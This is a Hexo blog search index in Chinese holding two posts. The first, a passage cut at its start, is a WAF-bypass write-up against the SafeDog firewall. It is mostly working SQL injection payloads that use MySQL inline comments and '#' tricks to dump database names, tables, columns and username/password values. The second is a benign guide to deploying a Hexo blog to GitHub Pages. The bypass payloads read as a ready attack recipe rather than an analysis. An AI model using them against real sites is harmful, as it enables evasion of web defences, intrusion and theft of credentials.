alt="image.png"></p><p>呜呜呜，还是被拦截了，吹牛逼吹了这么久，白吹了。</p><p>但是我这种阳光、帅气、善解人意且坚持不懈的小伙子会这么容易就放弃吗，显然不会，后面猜测是&#x2F;*!10440union select*&#x2F;中的union select被检测出来了，所以在union select中间下了点功夫，最终payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,3 --+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210114600-drzjavp.png" alt="image.png"></p><p>奈何无文化，一句卧槽走天下。</p><p>最后总结下安全狗的检测机制</p><p>首先整体语句做一个检测，这个检测也是最强最牛X的</p><p>‘#‘后的语句虽然被截断，但截断之后并不是和我们最初想的那样完全不检测，’#‘截断的语句还是会被检测，只是检测规则相比第一次不同且相比第一次检测强度相比较弱，所以我们可以对其进行绕过。</p><p>当然除了like关键字，我们还可以使用如下payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; and &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,3 --+</span><br><span class="line">-1&#x27; or &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,3 --+</span><br><span class="line">-1&#x27; regexp &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,3 --+</span><br><span class="line">-1&#x27; /*%23*/ /*!10440union%0aselect*/ 1,2,3 --+</span><br></pre></td></tr></table></figure><p>知道了这个特性接下来就，那就用这一招打过天下无敌手</p><p>爆数据库名和用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,database(/*!10440%0a*/),user(/*!10440%0a*/)--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210150144-zx3u2iv.png" alt="image.png"></p><p>爆表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,database(/*!10440%0a*/),group_concat(table_name) from/*%23*/information_schema.tables where table_schema=database(/*!10440%0a*/)--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220211094933-cz39a4b.png" alt="image.png"></p><p>爆字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,database(/*!10440%0a*/),group_concat(column_name) from/*%23*/information_schema.columns where table_schema=database(/*!10440%0a*/) /*!10440and*/ table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220211101324-3d9lcrx.png" alt="image.png"></p><p>爆字段中的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,database(/*!10440%0a*/),group_concat(username,password) from users--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220211101528-yxoqchw.png" alt="image.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1、内联yyds</p><p>2、在一些被拦截的地方多用&#x2F;*%23*&#x2F;和&#x2F;*!<em>10440%0a</em>*&#x2F;，有奇效。</p>]]></content>
      
      
      <categories>
          
          <category> Waf绕过小技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> Waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建</title>
      <link href="/2023/04/29/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/04/29/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="仓库准备"><a href="#仓库准备" class="headerlink" title="仓库准备"></a>仓库准备</h1><p>创建一个github仓库</p><p><img src="/assets/image-20230428113657-foci2pj.png" alt="image.png"></p><p>名字格式如下</p><p><img src="/assets/image-20230428143514-5re00dt.png" alt="image.png"></p><p>创建完成</p><p><img src="/assets/image-20230428143531-7pssyed.png" alt="image.png"></p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>可百度自行寻找安装方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安装npm</span><br><span class="line">安装git</span><br></pre></td></tr></table></figure><p>安装完成后确保能使用如下命令</p><p><img src="/assets/image-20230428114119-smyr1cd.png" alt="image.png"></p><p><img src="/assets/image-20230428114134-7i475dw.png" alt="image.png"></p><h1 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h1><p>创建一个目录，名字任意，然后打开git bash</p><p><img src="/assets/image-20230428114242-4sciiw9.png" alt="image.png"></p><p>使用git init初始化目录</p><p><img src="/assets/image-20230428114340-l6u5g0u.png" alt="image.png"></p><p>在git根目录下创建一个Blog目录，打开cmd窗口用如下命令安装hexo-cli</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>然后在Blog目录下使用如下命令完成hexo初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428114827-anozuyy.png" alt="image.png"></p><p>初始化后的文件结构</p><p><img src="/assets/image-20230428114845-kg8ru0e.png" alt="image.png"></p><p>使用如下命令启动博客</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428115010-qsc09n5.png" alt="image.png"></p><p>本地访问</p><p><img src="/assets/image-20230428115023-d7gxtc1.png" alt="image.png"></p><h1 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h1><p>Hexo默认的主体比较简约，屏幕使用占比不是很高，用户可以根据自己的喜好自定义Hexo主体，这里以butterfly主题为例</p><p>在Hexo的根目录执行如下命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https:<span class="comment">//github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428133950-mcf3uwk.png" alt="image.png"></p><p>在&#x2F;Blog&#x2F;themes下会克隆一个文件夹下来</p><p><img src="/assets/image-20230428134131-7qkc7yq.png" alt="image.png"></p><p>然后在Hexo的根目录下修改_config.yml文件里的theme为butterfly</p><p><img src="/assets/image-20230428134342-4oab1oq.png" alt="image.png"></p><p>修改后在安装一下 pug 和 stylus 的渲染器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428134521-73agchw.png" alt="image.png"></p><p>重新启动查看效果</p><p><img src="/assets/image-20230428134620-sc08gi3.png" alt="image.png"></p><h1 id="上传Github"><a href="#上传Github" class="headerlink" title="上传Github"></a>上传Github</h1><p>本地搭建没有问题之后，就可以把博客部署到Github仓库里去了</p><p>复制我们之前创建好的仓库的地址</p><p><img src="/assets/image-20230428143709-6100690.png" alt="image.png"></p><p>然后在Hexo的根目录下的_config.yml进行如下配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: <span class="string">&#x27;git&#x27;</span></span><br><span class="line">  repository: https:<span class="comment">//github.com/suifeng-kali/suifeng-kali.github.io.git</span></span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428143638-vwbi1d9.png" alt="image.png"></p><p>配置好后可以下载一个deploy-git，利用deploy-git简化部署步骤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428140134-k25rrrp.png" alt="image.png"></p><p>然后使用如下命令进行部署</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428214432-1ecgmg6.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
